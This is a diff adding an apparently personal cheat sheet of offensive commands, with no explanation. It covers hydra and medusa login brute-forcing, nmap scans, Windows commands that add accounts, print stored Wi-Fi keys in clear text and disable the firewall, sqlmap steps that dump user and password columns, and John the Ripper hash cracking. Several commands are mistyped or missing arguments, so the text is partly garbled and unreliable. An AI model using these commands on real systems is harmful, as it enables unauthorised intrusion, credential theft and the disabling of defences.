@@ -1,0 +1,30 @@
+//////////////////////////////////////////////////in the name of god\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+hydra -l -p -e ns -t -f -vV target http-get /
+hydra -l -p -e ns -f -V target ftp /
+========================================
+medusa -h target -U .. -p ...  -e ns -M prtocol -v 4
+===============================================
+nmap -p 21,.... target
+namp -sV -n target
+namp -O target
+============================================
+netuser user pass /add
+netuser user pass/del
+netsh wlan show profile name network name="target" key=clear
+netsh wlan show network
+netsh firewall set opmode disable
+netsh firewall set opmode disable
+netsh firewall 
+
+===============================================
+python sqlmap.py
+python sqlmap.py -u target --dbs
+python -u target D mysql --tables
+python -u target D mysql T join --columns
+python -u target D mysql T join  C user,pass --dump
+====================================================
+hash idnefer
+hash crack 
+john
+=====================================
+nslookup
